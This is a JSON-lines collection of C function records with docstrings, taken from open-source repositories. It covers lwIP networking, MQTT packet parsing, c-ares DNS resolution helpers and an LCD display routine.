{"docstring": "/**\n * Connect a netconn to a specific remote IP address and port.\n *\n * @param conn the netconn to connect\n * @param addr the remote IP address to connect to\n * @param port the remote port to connect to (no used for RAW)\n * @return ERR_OK if connected, return value of tcp_/udp_/raw_connect otherwise\n */\n", "func_signal": "err_t\nnetconn_connect(struct netconn *conn, ip_addr_t *addr, u16_t port)", "code": "{\n  struct api_msg msg;\n  err_t err;\n\n  LWIP_ERROR(\"netconn_connect: invalid conn\", (conn != NULL), return ERR_ARG;);\n\n  msg.function = do_connect;\n  msg.msg.conn = conn;\n  msg.msg.msg.bc.ipaddr = addr;\n  msg.msg.msg.bc.port = port;\n  /* This is the only function which need to not block tcpip_thread */\n  err = tcpip_apimsg(&msg);\n\n  NETCONN_SET_SAFE_ERR(conn, err);\n  return err;\n}", "path": "LWIP\\lwip-1.4.1\\src\\api\\api_lib.c", "repo_name": "maxlicheng/stm32f4_ucosii_lwip_mqtt", "stars": 317, "license": "None", "language": "c", "size": 3239}
{"docstring": "/**\n  * Deserializes the supplied (wire) buffer into an ack\n  * @param packettype returned integer - the MQTT packet type\n  * @param dup returned integer - the MQTT dup flag\n  * @param packetid returned integer - the MQTT packet identifier\n  * @param buf the raw buffer data, of the correct length determined by the remaining length field\n  * @param buflen the length in bytes of the data in the supplied buffer\n  * @return error code.  1 is success, 0 is failure\n  */\n", "func_signal": "int MQTTDeserialize_ack(unsigned char* packettype, unsigned char* dup, unsigned short* packetid, unsigned char* buf, int buflen)", "code": "{\n\tMQTTHeader header = {0};\n\tunsigned char* curdata = buf;\n\tunsigned char* enddata = NULL;\n\tint rc = 0;\n\tint mylen;\n\n\tFUNC_ENTRY;\n\theader.byte = readChar(&curdata);\n\t*dup = header.bits.dup;\n\t*packettype = header.bits.type;\n\n\tcurdata += (rc = MQTTPacket_decodeBuf(curdata, &mylen)); /* read remaining length */\n\tenddata = curdata + mylen;\n\n\tif (enddata - curdata < 2)\n\t\tgoto exit;\n\t*packetid = readInt(&curdata);\n\n\trc = 1;\nexit:\n\tFUNC_EXIT_RC(rc);\n\treturn rc;\n}", "path": "mqtt\\src\\MQTTDeserializePublish.c", "repo_name": "maxlicheng/stm32f4_ucosii_lwip_mqtt", "stars": 317, "license": "None", "language": "c", "size": 3239}
{"docstring": "/* char *\n * inet_ntop(af, src, dst, size)\n *     convert a network format address to presentation format.\n * return:\n *     pointer to presentation format address (`dst'), or NULL (see errno).\n * note:\n *     On Windows we store the error in the thread errno, not\n *     in the winsock error code. This is to avoid loosing the\n *     actual last winsock error. So use macro ERRNO to fetch the\n *     errno this funtion sets when returning NULL, not SOCKERRNO.\n * author:\n *     Paul Vixie, 1996.\n */\n", "func_signal": "const char *\nares_inet_ntop(int af, const void *src, char *dst, size_t size)", "code": "{\n  switch (af) {\n  case AF_INET:\n    return (inet_ntop4(src, dst, size));\n  case AF_INET6:\n    return (inet_ntop6(src, dst, size));\n  default:\n    SET_ERRNO(EAFNOSUPPORT);\n    return (NULL);\n  }\n  /* NOTREACHED */\n}", "path": "c-ares\\inet_ntop.c", "repo_name": "pelya/debian-noroot", "stars": 331, "license": "None", "language": "c", "size": 44249}
{"docstring": "/* Initialize a list node */\n", "func_signal": "void ares__init_list_node(struct list_node* node, void* d)", "code": "{\n  node->prev = NULL;\n  node->next = NULL;\n  node->data = d;\n}", "path": "c-ares\\ares_llist.c", "repo_name": "pelya/debian-noroot", "stars": 331, "license": "None", "language": "c", "size": 44249}
{"docstring": "/* Swap the contents of two lists */\n", "func_signal": "void ares__swap_lists(struct list_node* head_a,\n                      struct list_node* head_b)", "code": "{\n  int is_a_empty = ares__is_list_empty(head_a);\n  int is_b_empty = ares__is_list_empty(head_b);\n  struct list_node old_a = *head_a;\n  struct list_node old_b = *head_b;\n\n  if (is_a_empty) {\n    ares__init_list_head(head_b);\n  } else {\n    *head_b = old_a;\n    old_a.next->prev = head_b;\n    old_a.prev->next = head_b;\n  }\n  if (is_b_empty) {\n    ares__init_list_head(head_a);\n  } else {\n    *head_a = old_b;\n    old_b.next->prev = head_a;\n    old_b.prev->next = head_a;\n  }\n}", "path": "c-ares\\ares_llist.c", "repo_name": "pelya/debian-noroot", "stars": 331, "license": "None", "language": "c", "size": 44249}
{"docstring": "/**\n * The desired output for this method is that we set \"ret_buf\" to\n * something like:\n *\n * 192.168.0.1,dns01.my.domain,fe80::200:f8ff:fe21:67cf\n *\n * The only ordering requirement is that primary servers are listed\n * before secondary. There is no requirement that IPv4 addresses should\n * necessarily be before IPv6.\n *\n * Note that ret_size should ideally be big enough to hold around\n * 2-3 IPv4 and 2-3 IPv6 addresses.\n *\n * Finally, we need to return the total number of DNS servers located.\n */\n", "func_signal": "static int get_iphlpapi_dns_info (char *ret_buf, size_t ret_size)", "code": "{\n  const size_t  ipv4_size = INET_ADDRSTRLEN  + 1;  /* +1 for ',' at end */\n  const size_t  ipv6_size = INET6_ADDRSTRLEN + 12; /* +12 for \"%0123456789,\" at end */\n  size_t        left = ret_size;\n  char         *ret  = ret_buf;\n  int           count = 0;\n\n  /* Use the GetAdaptersAddresses method if it's available, otherwise\n     fall back to GetNetworkParams. */\n  if (ares_fpGetAdaptersAddresses != ZERO_NULL)\n  {\n    const ULONG            working_buf_size = 15000;\n    IP_ADAPTER_ADDRESSES   *pFirstEntry = NULL;\n    IP_ADAPTER_ADDRESSES   *pEntry = NULL;\n    ULONG                  bufSize = 0;\n    ULONG                  result = 0;\n\n    /* According to MSDN, the recommended way to do this is to use a temporary\n       buffer of 15K, to \"dramatically reduce the chance that the GetAdaptersAddresses\n       method returns ERROR_BUFFER_OVERFLOW\" */\n    pFirstEntry  = ( IP_ADAPTER_ADDRESSES * ) malloc( working_buf_size );\n    bufSize = working_buf_size;\n    if( !pFirstEntry )\n      return 0;\n\n    /* Call the method one time */\n    result = ( *ares_fpGetAdaptersAddresses )( AF_UNSPEC, 0, 0, pFirstEntry, &bufSize );\n    if( result == ERROR_BUFFER_OVERFLOW )\n    {\n      /* Reallocate, bufSize should now be set to the required size */\n      pFirstEntry = ( IP_ADAPTER_ADDRESSES * ) realloc( pFirstEntry, bufSize );\n      if( !pFirstEntry )\n        return 0;\n\n      /* Call the method a second time */\n      result = ( *ares_fpGetAdaptersAddresses )( AF_UNSPEC, 0, 0, pFirstEntry, &bufSize );\n      if( result == ERROR_BUFFER_OVERFLOW )\n      {\n        /* Reallocate, bufSize should now be set to the required size */\n        pFirstEntry = ( IP_ADAPTER_ADDRESSES * ) realloc( pFirstEntry, bufSize );\n        if( !pFirstEntry )\n          return 0;\n\n        /* Call the method a third time. The maximum number of times we're going to do\n           this is 3. Three shall be the number thou shalt count, and the number of the\n           counting shall be three.  Five is right out. */\n        result = ( *ares_fpGetAdaptersAddresses )( AF_UNSPEC, 0, 0, pFirstEntry, &bufSize );\n      }\n    }\n\n    /* Check the current result for failure */\n    if( result != ERROR_SUCCESS )\n    {\n      free( pFirstEntry );\n      return 0;\n    }\n\n    /* process the results */\n    for( pEntry = pFirstEntry ; pEntry != NULL ; pEntry = pEntry->Next )\n    {\n      IP_ADAPTER_DNS_SERVER_ADDRESS* pDNSAddr = pEntry->FirstDnsServerAddress;\n      for( ; pDNSAddr != NULL ; pDNSAddr = pDNSAddr->Next )\n      {\n        struct sockaddr *pGenericAddr = pDNSAddr->Address.lpSockaddr;\n        size_t stringlen = 0;\n\n        if( pGenericAddr->sa_family == AF_INET && left > ipv4_size )\n        {\n          /* Handle the v4 case */\n          struct sockaddr_in *pIPv4Addr = ( struct sockaddr_in * ) pGenericAddr;\n          ares_inet_ntop( AF_INET, &pIPv4Addr->sin_addr, ret, ipv4_size - 1 ); /* -1 for comma */\n\n          /* Append a comma to the end, THEN NULL. Should be OK because we\n             already tested the size at the top of the if statement. */\n          stringlen = strlen( ret );\n          ret[ stringlen ] = ',';\n          ret[ stringlen + 1 ] = '\\0';\n          ret += stringlen + 1;\n          left -= ret - ret_buf;\n          ++count;\n        }\n        else if( pGenericAddr->sa_family == AF_INET6 && left > ipv6_size )\n        {\n          /* Handle the v6 case */\n          struct sockaddr_in6 *pIPv6Addr = ( struct sockaddr_in6 * ) pGenericAddr;\n          ares_inet_ntop( AF_INET6, &pIPv6Addr->sin6_addr, ret, ipv6_size - 1 ); /* -1 for comma */\n\n          /* Append a comma to the end, THEN NULL. Should be OK because we\n             already tested the size at the top of the if statement. */\n          stringlen = strlen( ret );\n          ret[ stringlen ] = ',';\n          ret[ stringlen + 1 ] = '\\0';\n          ret += stringlen + 1;\n          left -= ret - ret_buf;\n          ++count;\n\n          /* NB on Windows this also returns stuff in the fec0::/10 range,\n             seems to be hard-coded somehow. Do we need to ignore them? */\n        }\n      }\n    }\n\n    if( pFirstEntry )\n      free( pFirstEntry );\n    if (ret > ret_buf)\n      ret[-1] = '\\0';\n    return count;\n  }\n  else\n  {\n    FIXED_INFO    *fi, *newfi;\n    DWORD          size = sizeof (*fi);\n    IP_ADDR_STRING *ipAddr;\n    int            i;\n    int            debug  = 0;\n    HRESULT        res;\n\n    fi = malloc(size);\n    if (!fi)\n      return 0;\n\n    res = (*ares_fpGetNetworkParams) (fi, &size);\n    if ((res != ERROR_BUFFER_OVERFLOW) && (res != ERROR_SUCCESS))\n      goto quit;\n\n    newfi = realloc(fi, size);\n    if (!newfi)\n      goto quit;\n\n    fi = newfi;\n    res = (*ares_fpGetNetworkParams) (fi, &size);\n    if (res != ERROR_SUCCESS)\n      goto quit;\n\n    if (debug)\n    {\n      printf (\"Host Name: %s\\n\", fi->HostName);\n      printf (\"Domain Name: %s\\n\", fi->DomainName);\n      printf (\"DNS Servers:\\n\"\n              \"    %s (primary)\\n\", fi->DnsServerList.IpAddress.String);\n    }\n    if (strlen(fi->DnsServerList.IpAddress.String) > 0 &&\n        inet_addr(fi->DnsServerList.IpAddress.String) != INADDR_NONE &&\n        left > ipv4_size)\n    {\n      ret += sprintf (ret, \"%s,\", fi->DnsServerList.IpAddress.String);\n      left -= ret - ret_buf;\n      ++count;\n    }\n\n    for (i = 0, ipAddr = fi->DnsServerList.Next; ipAddr && left > ipv4_size;\n         ipAddr = ipAddr->Next, i++)\n    {\n      if (inet_addr(ipAddr->IpAddress.String) != INADDR_NONE)\n      {\n         ret += sprintf (ret, \"%s,\", ipAddr->IpAddress.String);\n         left -= ret - ret_buf;\n         ++count;\n      }\n      if (debug)\n         printf (\"    %s (secondary %d)\\n\", ipAddr->IpAddress.String, i+1);\n    }\n\nquit:\n    if (fi)\n      free(fi);\n\n    if (debug && left <= ipv4_size)\n      printf (\"Too many nameservers. Truncating to %d addressess\", count);\n    if (ret > ret_buf)\n      ret[-1] = '\\0';\n    return count;\n  }\n}", "path": "c-ares\\ares_init.c", "repo_name": "pelya/debian-noroot", "stars": 331, "license": "None", "language": "c", "size": 44249}
{"docstring": "/* Find the first entry in sortlist which matches addr.  Return nsort\n * if none of them match.\n */\n", "func_signal": "static int get_address_index(const struct in_addr *addr,\n                             const struct apattern *sortlist,\n                             int nsort)", "code": "{\n  int i;\n\n  for (i = 0; i < nsort; i++)\n    {\n      if (sortlist[i].family != AF_INET)\n        continue;\n      if (sortlist[i].type == PATTERN_MASK)\n        {\n          if ((addr->s_addr & sortlist[i].mask.addr4.s_addr)\n              == sortlist[i].addrV4.s_addr)\n            break;\n        }\n      else\n        {\n          if (!ares_bitncmp(&addr->s_addr, &sortlist[i].addrV4.s_addr,\n                            sortlist[i].mask.bits))\n            break;\n        }\n    }\n  return i;\n}", "path": "c-ares\\ares_gethostbyname.c", "repo_name": "pelya/debian-noroot", "stars": 331, "license": "None", "language": "c", "size": 44249}
{"docstring": "/* local_dev_name should be null terminated. */\n", "func_signal": "void ares_set_local_dev(ares_channel channel,\n                        const char* local_dev_name)", "code": "{\n  strncpy(channel->local_dev_name, local_dev_name,\n          sizeof(channel->local_dev_name));\n  channel->local_dev_name[sizeof(channel->local_dev_name) - 1] = 0;\n}", "path": "c-ares\\ares_init.c", "repo_name": "pelya/debian-noroot", "stars": 331, "license": "None", "language": "c", "size": 44249}
{"docstring": "/* Simply decodes a length-encoded character string. The first byte of the\n * input is the length of the string to be returned and the bytes thereafter\n * are the characters of the string. The returned result will be NULL\n * terminated.\n */\n", "func_signal": "int ares_expand_string(const unsigned char *encoded,\n                       const unsigned char *abuf,\n                       int alen,\n                       unsigned char **s,\n                       long *enclen)", "code": "{\n  unsigned char *q;\n  union {\n    ssize_t sig;\n     size_t uns;\n  } elen;\n\n  if (encoded == abuf+alen)\n    return ARES_EBADSTR;\n\n  elen.uns = *encoded;\n  if (encoded+elen.sig+1 > abuf+alen)\n    return ARES_EBADSTR;\n\n  encoded++;\n\n  *s = malloc(elen.uns+1);\n  if (*s == NULL)\n    return ARES_ENOMEM;\n  q = *s;\n  strncpy((char *)q, (char *)encoded, elen.uns);\n  q[elen.uns] = '\\0';\n\n  *s = q;\n\n  *enclen = (long)(elen.sig+1);\n\n  return ARES_SUCCESS;\n}", "path": "c-ares\\ares_expand_string.c", "repo_name": "pelya/debian-noroot", "stars": 331, "license": "None", "language": "c", "size": 44249}
{"docstring": "/* a unique query id is generated using an rc4 key. Since the id may already\n   be used by a running query (as infrequent as it may be), a lookup is\n   performed per id generation. In practice this search should happen only\n   once per newly generated id\n*/\n", "func_signal": "static unsigned short generate_unique_id(ares_channel channel)", "code": "{\n  unsigned short id;\n\n  do {\n    id = ares__generate_new_id(&channel->id_key);\n  } while (find_query_by_id(channel, id));\n\n  return (unsigned short)id;\n}", "path": "c-ares\\ares_query.c", "repo_name": "pelya/debian-noroot", "stars": 331, "license": "None", "language": "c", "size": 44249}
{"docstring": "/* initialize an rc4 key. If possible a cryptographically secure random key\n   is generated using a suitable function (for example win32's RtlGenRandom as\n   described in\n   http://blogs.msdn.com/michael_howard/archive/2005/01/14/353379.aspx\n   otherwise the code defaults to cross-platform albeit less secure mechanism\n   using rand\n*/\n", "func_signal": "static void randomize_key(unsigned char* key,int key_data_len)", "code": "{\n  int randomized = 0;\n  int counter=0;\n  TRACE();\n#ifdef WIN32\n  BOOLEAN res;\n  if (ares_fpSystemFunction036)\n    {\n      res = (*ares_fpSystemFunction036) (key, key_data_len);\n      if (res)\n        randomized = 1;\n    }\n#else /* !WIN32 */\n#ifdef RANDOM_FILE\n  TRACE();\n  FILE *f = fopen(RANDOM_FILE, \"rb\");\n  if(f) {\n    counter = aresx_uztosi(fread(key, 1, key_data_len, f));\n    fclose(f);\n  }\n  TRACE();\n#endif\n#endif /* WIN32 */\n\n  TRACE();\n  if ( !randomized ) {\n    for (;counter<key_data_len;counter++)\n      key[counter]=(unsigned char)(rand() % 256);\n  }\n  TRACE();\n}", "path": "c-ares\\ares_init.c", "repo_name": "pelya/debian-noroot", "stars": 331, "license": "None", "language": "c", "size": 44249}
{"docstring": "/* This is an internal function.  Its contract is to read a line from\n * a file into a dynamically allocated buffer, zeroing the trailing\n * newline if there is one.  The calling routine may call\n * ares__read_line multiple times with the same buf and bufsize\n * pointers; *buf will be reallocated and *bufsize adjusted as\n * appropriate.  The initial value of *buf should be NULL.  After the\n * calling routine is done reading lines, it should free *buf.\n */\n", "func_signal": "int ares__read_line(FILE *fp, char **buf, size_t *bufsize)", "code": "{\n  char *newbuf;\n  size_t offset = 0;\n  size_t len;\n\n  if (*buf == NULL)\n    {\n      *buf = malloc(128);\n      if (!*buf)\n        return ARES_ENOMEM;\n      *bufsize = 128;\n    }\n\n  for (;;)\n    {\n      int bytestoread = aresx_uztosi(*bufsize - offset);\n\n      if (!fgets(*buf + offset, bytestoread, fp))\n        return (offset != 0) ? 0 : (ferror(fp)) ? ARES_EFILE : ARES_EOF;\n      len = offset + strlen(*buf + offset);\n      if ((*buf)[len - 1] == '\\n')\n        {\n          (*buf)[len - 1] = 0;\n          break;\n        }\n      offset = len;\n      if(len < *bufsize - 1)\n        continue;\n\n      /* Allocate more space. */\n      newbuf = realloc(*buf, *bufsize * 2);\n      if (!newbuf)\n        return ARES_ENOMEM;\n      *buf = newbuf;\n      *bufsize *= 2;\n    }\n  return ARES_SUCCESS;\n}", "path": "c-ares\\ares__read_line.c", "repo_name": "pelya/debian-noroot", "stars": 331, "license": "None", "language": "c", "size": 44249}
{"docstring": "/* Inserts new_node before old_node */\n", "func_signal": "void ares__insert_in_list(struct list_node* new_node,\n                          struct list_node* old_node)", "code": "{\n  new_node->next = old_node;\n  new_node->prev = old_node->prev;\n  old_node->prev->next = new_node;\n  old_node->prev = new_node;\n}", "path": "c-ares\\ares_llist.c", "repo_name": "pelya/debian-noroot", "stars": 331, "license": "None", "language": "c", "size": 44249}
{"docstring": "/* const char *\n * inet_ntop6(src, dst, size)\n *     convert IPv6 binary address into presentation (printable) format\n * author:\n *     Paul Vixie, 1996.\n */\n", "func_signal": "static const char *\ninet_ntop6(const unsigned char *src, char *dst, size_t size)", "code": "{\n  /*\n   * Note that int32_t and int16_t need only be \"at least\" large enough\n   * to contain a value of the specified size.  On some systems, like\n   * Crays, there is no such thing as an integer variable with 16 bits.\n   * Keep this in mind if you think this function should have been coded\n   * to use pointer overlays.  All the world's not a VAX.\n   */\n  char tmp[sizeof(\"ffff:ffff:ffff:ffff:ffff:ffff:255.255.255.255\")];\n  char *tp;\n  struct { int base, len; } best, cur;\n  unsigned int words[NS_IN6ADDRSZ / NS_INT16SZ];\n  int i;\n\n  /*\n   * Preprocess:\n   *  Copy the input (bytewise) array into a wordwise array.\n   *  Find the longest run of 0x00's in src[] for :: shorthanding.\n   */\n  memset(words, '\\0', sizeof(words));\n  for (i = 0; i < NS_IN6ADDRSZ; i++)\n    words[i / 2] |= (src[i] << ((1 - (i % 2)) << 3));\n  best.base = -1;\n  best.len = 0;\n  cur.base = -1;\n  cur.len = 0;\n  for (i = 0; i < (NS_IN6ADDRSZ / NS_INT16SZ); i++) {\n    if (words[i] == 0) {\n      if (cur.base == -1)\n        cur.base = i, cur.len = 1;\n      else\n        cur.len++;\n    } else {\n      if (cur.base != -1) {\n        if (best.base == -1 || cur.len > best.len)\n          best = cur;\n        cur.base = -1;\n      }\n    }\n  }\n  if (cur.base != -1) {\n    if (best.base == -1 || cur.len > best.len)\n      best = cur;\n  }\n  if (best.base != -1 && best.len < 2)\n    best.base = -1;\n\n  /*\n   * Format the result.\n   */\n  tp = tmp;\n  for (i = 0; i < (NS_IN6ADDRSZ / NS_INT16SZ); i++) {\n    /* Are we inside the best run of 0x00's? */\n    if (best.base != -1 && i >= best.base &&\n        i < (best.base + best.len)) {\n      if (i == best.base)\n        *tp++ = ':';\n      continue;\n    }\n    /* Are we following an initial run of 0x00s or any real hex? */\n    if (i != 0)\n      *tp++ = ':';\n    /* Is this address an encapsulated IPv4? */\n    if (i == 6 && best.base == 0 && (best.len == 6 ||\n        (best.len == 7 && words[7] != 0x0001) ||\n        (best.len == 5 && words[5] == 0xffff))) {\n      if (!inet_ntop4(src+12, tp, sizeof(tmp) - (tp - tmp)))\n        return (NULL);\n      tp += strlen(tp);\n      break;\n    }\n    tp += sprintf(tp, \"%x\", words[i]);\n  }\n  /* Was it a trailing run of 0x00's? */\n  if (best.base != -1 && (best.base + best.len) == \n      (NS_IN6ADDRSZ / NS_INT16SZ))\n    *tp++ = ':';\n  *tp++ = '\\0';\n\n  /*\n   * Check for overflow, copy, and we're done.\n   */\n  if ((size_t)(tp - tmp) > size) {\n    SET_ERRNO(ENOSPC);\n    return (NULL);\n  }\n  strcpy(dst, tmp);\n  return (dst);\n}", "path": "c-ares\\inet_ntop.c", "repo_name": "pelya/debian-noroot", "stars": 331, "license": "None", "language": "c", "size": 44249}
{"docstring": "/* Removes the node from the list it's in, if any */\n", "func_signal": "void ares__remove_from_list(struct list_node* node)", "code": "{\n  if (node->next != NULL) {\n    node->prev->next = node->next;\n    node->next->prev = node->prev;\n    node->prev = NULL;\n    node->next = NULL;\n  }\n}", "path": "c-ares\\ares_llist.c", "repo_name": "pelya/debian-noroot", "stars": 331, "license": "None", "language": "c", "size": 44249}
{"docstring": "/* const char *\n * inet_ntop4(src, dst, size)\n *     format an IPv4 address\n * return:\n *     `dst' (as a const)\n * notes:\n *     (1) uses no statics\n *     (2) takes a unsigned char* not an in_addr as input\n * author:\n *     Paul Vixie, 1996.\n */\n", "func_signal": "static const char *\ninet_ntop4(const unsigned char *src, char *dst, size_t size)", "code": "{\n  static const char fmt[] = \"%u.%u.%u.%u\";\n  char tmp[sizeof(\"255.255.255.255\")];\n\n  if ((size_t)sprintf(tmp, fmt, src[0], src[1], src[2], src[3]) >= size) {\n    SET_ERRNO(ENOSPC);\n    return (NULL);\n  }\n  strcpy(dst, tmp);\n  return (dst);\n}", "path": "c-ares\\inet_ntop.c", "repo_name": "pelya/debian-noroot", "stars": 331, "license": "None", "language": "c", "size": 44249}
{"docstring": "/* !WATT32 */\n", "func_signal": "static int set_search(ares_channel channel, const char *str)", "code": "{\n  int n;\n  const char *p, *q;\n\n  if(channel->ndomains != -1) {\n    /* if we already have some domains present, free them first */\n    for(n=0; n < channel->ndomains; n++)\n      free(channel->domains[n]);\n    free(channel->domains);\n    channel->domains = NULL;\n    channel->ndomains = -1;\n  }\n\n  /* Count the domains given. */\n  n = 0;\n  p = str;\n  while (*p)\n    {\n      while (*p && !ISSPACE(*p))\n        p++;\n      while (ISSPACE(*p))\n        p++;\n      n++;\n    }\n\n  if (!n)\n    {\n      channel->ndomains = 0;\n      return ARES_SUCCESS;\n    }\n\n  channel->domains = malloc(n * sizeof(char *));\n  if (!channel->domains)\n    return ARES_ENOMEM;\n\n  /* Now copy the domains. */\n  n = 0;\n  p = str;\n  while (*p)\n    {\n      channel->ndomains = n;\n      q = p;\n      while (*q && !ISSPACE(*q))\n        q++;\n      channel->domains[n] = malloc(q - p + 1);\n      if (!channel->domains[n])\n        return ARES_ENOMEM;\n      memcpy(channel->domains[n], p, q - p);\n      channel->domains[n][q - p] = 0;\n      p = q;\n      while (ISSPACE(*p))\n        p++;\n      n++;\n    }\n  channel->ndomains = n;\n\n  return ARES_SUCCESS;\n}", "path": "c-ares\\ares_init.c", "repo_name": "pelya/debian-noroot", "stars": 331, "license": "None", "language": "c", "size": 44249}
{"docstring": "/* Find the first entry in sortlist which matches addr.  Return nsort\n * if none of them match.\n */\n", "func_signal": "static int get6_address_index(const struct ares_in6_addr *addr,\n                              const struct apattern *sortlist,\n                              int nsort)", "code": "{\n  int i;\n\n  for (i = 0; i < nsort; i++)\n    {\n      if (sortlist[i].family != AF_INET6)\n        continue;\n        if (!ares_bitncmp(addr,\n                          &sortlist[i].addrV6,\n                          sortlist[i].mask.bits))\n          break;\n    }\n  return i;\n}", "path": "c-ares\\ares_gethostbyname.c", "repo_name": "pelya/debian-noroot", "stars": 331, "license": "None", "language": "c", "size": 44249}
{"docstring": "/*\n * int\n * inet_net_pton(af, src, dst, size)\n *      convert network number from presentation to network format.\n *      accepts hex octets, hex strings, decimal octets, and /CIDR.\n *      \"size\" is in bytes and describes \"dst\".\n * return:\n *      number of bits, either imputed classfully or specified with /CIDR,\n *      or -1 if some failure occurred (check errno).  ENOENT means it was\n *      not a valid network specification.\n * note:\n *      On Windows we store the error in the thread errno, not\n *      in the winsock error code. This is to avoid loosing the\n *      actual last winsock error. So use macro ERRNO to fetch the\n *      errno this funtion sets when returning (-1), not SOCKERRNO.\n * author:\n *      Paul Vixie (ISC), June 1996\n */\n", "func_signal": "int\nares_inet_net_pton(int af, const char *src, void *dst, size_t size)", "code": "{\n  switch (af) {\n  case AF_INET:\n    return (inet_net_pton_ipv4(src, dst, size));\n  case AF_INET6:\n    return (inet_net_pton_ipv6(src, dst, size));\n  default:\n    SET_ERRNO(EAFNOSUPPORT);\n    return (-1);\n  }\n}", "path": "c-ares\\inet_net_pton.c", "repo_name": "pelya/debian-noroot", "stars": 331, "license": "None", "language": "c", "size": 44249}
{"docstring": "/* If the name looks like an IP address, fake up a host entry, end the\n * query immediately, and return true.  Otherwise return false.\n */\n", "func_signal": "static int fake_hostent(const char *name, int family,\n                        ares_host_callback callback, void *arg)", "code": "{\n  struct hostent hostent;\n  char *aliases[1] = { NULL };\n  char *addrs[2];\n  int result = 0;\n  struct in_addr in;\n  struct ares_in6_addr in6;\n\n  if (family == AF_INET || family == AF_INET6)\n    {\n      /* It only looks like an IP address if it's all numbers and dots. */\n      int numdots = 0, valid = 1;\n      const char *p;\n      for (p = name; *p; p++)\n        {\n          if (!ISDIGIT(*p) && *p != '.') {\n            valid = 0;\n            break;\n          } else if (*p == '.') {\n            numdots++;\n          }\n        }\n\n      /* if we don't have 3 dots, it is illegal\n       * (although inet_addr doesn't think so).\n       */\n      if (numdots != 3 || !valid)\n        result = 0;\n      else\n        result = ((in.s_addr = inet_addr(name)) == INADDR_NONE ? 0 : 1);\n\n      if (result)\n        family = AF_INET;\n    }\n  if (family == AF_INET6)\n    result = (ares_inet_pton(AF_INET6, name, &in6) < 1 ? 0 : 1);\n\n  if (!result)\n    return 0;\n\n  if (family == AF_INET)\n    {\n      hostent.h_length = (int)sizeof(struct in_addr);\n      addrs[0] = (char *)&in;\n    }\n  else if (family == AF_INET6)\n    {\n      hostent.h_length = (int)sizeof(struct ares_in6_addr);\n      addrs[0] = (char *)&in6;\n    }\n  /* Duplicate the name, to avoid a constness violation. */\n  hostent.h_name = strdup(name);\n  if (!hostent.h_name)\n    {\n      callback(arg, ARES_ENOMEM, 0, NULL);\n      return 1;\n    }\n\n  /* Fill in the rest of the host structure and terminate the query. */\n  addrs[1] = NULL;\n  hostent.h_aliases = aliases;\n  hostent.h_addrtype = family;\n  hostent.h_addr_list = addrs;\n  callback(arg, ARES_SUCCESS, 0, &hostent);\n\n  free((char *)(hostent.h_name));\n  return 1;\n}", "path": "c-ares\\ares_gethostbyname.c", "repo_name": "pelya/debian-noroot", "stars": 331, "license": "None", "language": "c", "size": 44249}
{"docstring": "/* This is an API method */\n", "func_signal": "int ares_gethostbyname_file(ares_channel channel, const char *name,\n                            int family, struct hostent **host)", "code": "{\n  int result;\n\n  /* We only take the channel to ensure that ares_init() been called. */\n  if(channel == NULL)\n    {\n      /* Anything will do, really.  This seems fine, and is consistent with\n         other error cases. */\n      *host = NULL;\n      return ARES_ENOTFOUND;\n    }\n\n  /* Just chain to the internal implementation we use here; it's exactly\n   * what we want.\n   */\n  result = file_lookup(name, family, host);\n  if(result != ARES_SUCCESS)\n    {\n      /* We guarantee a NULL hostent on failure. */\n      *host = NULL;\n    }\n  return result;\n}", "path": "c-ares\\ares_gethostbyname.c", "repo_name": "pelya/debian-noroot", "stars": 331, "license": "None", "language": "c", "size": 44249}
{"docstring": "/* Return the length of the expansion of an encoded domain name, or\n * -1 if the encoding is invalid.\n */\n", "func_signal": "static int name_length(const unsigned char *encoded, const unsigned char *abuf,\n                       int alen)", "code": "{\n  int n = 0, offset, indir = 0;\n\n  /* Allow the caller to pass us abuf + alen and have us check for it. */\n  if (encoded == abuf + alen)\n    return -1;\n\n  while (*encoded)\n    {\n      if ((*encoded & INDIR_MASK) == INDIR_MASK)\n        {\n          /* Check the offset and go there. */\n          if (encoded + 1 >= abuf + alen)\n            return -1;\n          offset = (*encoded & ~INDIR_MASK) << 8 | *(encoded + 1);\n          if (offset >= alen)\n            return -1;\n          encoded = abuf + offset;\n\n          /* If we've seen more indirects than the message length,\n           * then there's a loop.\n           */\n          if (++indir > alen)\n            return -1;\n        }\n      else\n        {\n          offset = *encoded;\n          if (encoded + offset + 1 >= abuf + alen)\n            return -1;\n          encoded++;\n          while (offset--)\n            {\n              n += (*encoded == '.' || *encoded == '\\\\') ? 2 : 1;\n              encoded++;\n            }\n          n++;\n        }\n    }\n\n  /* If there were any labels at all, then the number of dots is one\n   * less than the number of labels, so subtract one.\n   */\n  return (n) ? n - 1 : n;\n}", "path": "c-ares\\ares_expand_name.c", "repo_name": "pelya/debian-noroot", "stars": 331, "license": "None", "language": "c", "size": 44249}
{"docstring": "/* ******************************************************************************* */\n// position to next line to column xx\n// Text_line number is incremented by 1, if possible (not yet at the last line).\n// If already at the last line of the display, last_line_used is set to 1 .\n", "func_signal": "void lcd_next_line(uint8_t xx)", "code": "{\n   lcd_clear_line();\n   lcd_text_line ++;\n   if (lcd_text_line > (LCD_LINES - 1))  {\n      // Limit is reached\n      lcd_text_line = (LCD_LINES - 1);\n      last_line_used = 1;\n   } else {\n      last_line_used = 0;\n   }\n   lcd_set_cursor((uint8_t)(lcd_text_line * PAGES_PER_LINE), xx);\n#ifdef WITH_UART\n   uart_newline();\t\t// start of new line\n #if WITH_UART == 2\t\t// MAURO\n   uart_putc('1'+lcd_text_line);\t// MAURO\n #endif\t\t\t\t// MAURO\n#endif\n}", "path": "Software\\trunk\\lcd-routines.c", "repo_name": "Mikrocontroller-net/transistortester", "stars": 306, "license": "None", "language": "c", "size": 195437}
